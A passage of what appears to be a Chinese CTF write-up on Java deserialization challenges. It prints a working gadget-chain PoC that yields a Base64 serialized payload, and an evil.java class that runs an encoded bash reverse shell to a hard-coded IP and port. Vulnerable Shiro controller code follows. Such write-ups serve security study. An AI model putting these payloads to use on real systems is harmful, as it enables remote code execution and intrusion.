class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">   <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">   <span class="keyword">private</span> Class targetclass;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String anyexcept;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class <span class="title function_">getTargetclass</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetclass</span><span class="params">(Class targetclass)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.targetclass = targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object[] getTypearg() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypearg</span><span class="params">(Object[] typearg)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typearg = typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">      <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnyexcept</span><span class="params">(String anyexcept)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.anyexcept = anyexcept;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class[] getTypeparam() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypeparam</span><span class="params">(Class[] typeparam)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typeparam = typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">   <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好对应CC3的这里, 不过<code>InstantiateTransformer.transform()</code>这一步是用不了了, 所以要寻找<code>LazyMap.get()</code>到<code>TrAXFilter.constructor()</code>的链条</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816214619253.png" alt="image-20240816214619253"></p><p>题目有一条提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</span><br></pre></td></tr></table></figure><p>这一步是隐式调用, 类似于fastjson中的那样</p><p>并且在<code>LazyMap#get</code>中恰好调用了<code>map.put</code></p><p>那么这条链子就成型了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816215629072.png" alt="image-20240816215629072"></p><p>动手编写poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">       <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\DeserBug\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcodes = &#123;codes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="number">3</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilcodes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">Properties</span>());</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(myexpect, <span class="string">&quot;targetclass&quot;</span>, TrAXFilter.class);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typeparam&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typearg&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        setValue(factory, <span class="string">&quot;iConstant&quot;</span>, myexpect);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serialize);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        saveFile(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        System.out.println(poc.length());</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(poc);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveFile</span><span class="params">(String poc, String fileName)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fileName))) &#123;</span><br><span class="line">           writer.write(poc);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String key,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(key);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MTCTF2022-easyjava"><a href="#MTCTF2022-easyjava" class="headerlink" title="[MTCTF2022]easyjava"></a>[MTCTF2022]easyjava</h2><p>先去看pom.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8090</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/web</span></span><br><span class="line"><span class="attr">spring.thymeleaf.cache</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">spring.thymeleaf.mode</span>=<span class="string">HTML5</span></span><br></pre></td></tr></table></figure><p>可以看见网站根目录在&#x2F;web</p><p>再看pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--hibernate--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.8.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有两处是存在漏洞的</p><p>看源码</p><p>HelloConctroller.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.MyController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.butler.springboot14shiro.Util.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String username, String password, Model model)</span> &#123;</span><br><span class="line">      <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">      <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(username, password);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         subject.login(token);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnknownAccountException var7) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IncorrectCredentialsException var8) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/admin/hello&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = false)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">         <span class="type">MyObjectInputStream</span> <span class="variable">myObjectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(inputStream);</span><br><span class="line">         myObjectInputStream.readObject();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">         var6.printStackTrace();</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;data=&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ShrioConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">      <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">      bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">      Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">       <span class="comment">// 这里 &quot;anon&quot;表示匿名可访问, &quot;authc&quot;是需要鉴权</span></span><br><span class="line">      filterMap.put(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">      bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> bean;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;adminRealm&quot;)</span> AdminRealm adminRealm)</span> &#123;</span><br><span class="line">      <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">      securityManager.setRealm(adminRealm);</span><br><span class="line">      <span class="keyword">return</span> securityManager;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> AdminRealm <span class="title 